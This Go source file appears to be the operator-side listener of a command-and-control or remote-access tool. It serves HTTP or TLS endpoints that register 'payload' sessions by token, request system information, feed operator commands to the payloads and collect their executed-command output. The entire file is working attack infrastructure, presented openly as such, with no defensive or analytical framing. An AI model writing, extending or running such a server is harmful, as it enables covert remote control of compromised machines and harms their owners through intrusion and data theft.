package server

import (
	"crypto/tls"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
)

//go:generate go-bindata -o cert.go ../cert/...

var Server *http.Server

// GetCmd handles the /getcmd endpoint and requests a
// cmd from stdin to send to the payload
func GetCmd(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodGet {
		token := req.Header.Get("token")

		index, isNew := CreateSession(token)

		sessionObj, _ := GetSession(index)

		if isNew {
			cli.Printf("[+] New connection with session id: %d\n", index)
			// if the session is new, get the system information
			fmt.Fprint(w, "__sysinfo__")
		} else {
			cli.Printf("[+] Got request for cmd from session id: %d\n", index)

			// Set session as open
			sessionObj.Open = true

			var command string

			for {
				select {
				case str := <-sessionObj.Cmd:
					command = str
					fmt.Fprintf(w, command)
				case <-req.Context().Done():
					cli.Printf("[-] Connection closed from session: %d\n", index)
					sessionObj.Open = false
					w.WriteHeader(444) // 444 - Connection Closed Without Response
				}
				break
			}

			if command == "quit" {
				sessionObj.Open = false
				cli.Printf("[+] Session %d quit.\n", index)
			}
		}
	}
}

// CmdOutput handles the /cmdoutput endpoint and retrieves
// the output of a cmd executed by the payload
func CmdOutput(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		body, err := ioutil.ReadAll(req.Body)
		defer req.Body.Close()
		if err != nil {
			cli.Printf("[-] Got error:\n%s\n", err)
			return
		}

		index := FindSessionIndexByToken(req.Header.Get("Token"))

		// close connection, the client will open a new one
		w.Header().Set("Connection", "close")
		cli.Printf("[+] Got response from session id %d:\n%s\n", index, body)
		fmt.Fprintf(w, "Successfully posted output")
	}
}

func CloseServer() error {
	var err error
	if Server != nil {
		err = Server.Close()
		Server = nil
	} else {
		err = errors.New("There are not listeners running")
	}
	return err
}

func IsListening() bool {
	if Server != nil {
		return true
	} else {
		return false
	}
}

func SetupServer(host string, noTLS bool) *http.Server {
	// read cert binary data from bundled assets
	certData, err := Asset("../cert/server.crt")
	if err != nil {
		cli.Printf("[-] Error reading cert file: %s\n", err)
	}
	// read key binary data from bundled assets
	keyData, err := Asset("../cert/server.key")
	if err != nil {
		cli.Printf("[-] Error reading cert file: %s\n", err)
	}

	// create the server with the custom pair
	cert, err := tls.X509KeyPair(certData, keyData)
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	server := http.Server{
		Addr:      host,
		TLSConfig: tlsConfig,
	}
	if noTLS {
		server.TLSConfig = nil
	}

	return &server
}

func StartListener(host string, port int, noTLS bool) {
	// check if a listener is already running
	if IsListening() {
		cli.Println("[-] A listener is already running.")
		return
	}

	hoststr := fmt.Sprintf("%s:%d", host, port)

	// start the server
	cli.Printf("[+] Server listening on (%s)\n", hoststr)
	Server = SetupServer(hoststr, noTLS)

	if noTLS {
		err := Server.ListenAndServe()
		if err != http.ErrServerClosed {
			cli.PrintError(err)
		}
	} else {
		err := Server.ListenAndServeTLS("", "")
		if err != http.ErrServerClosed {
			cli.PrintError(err)
		}
	}
}
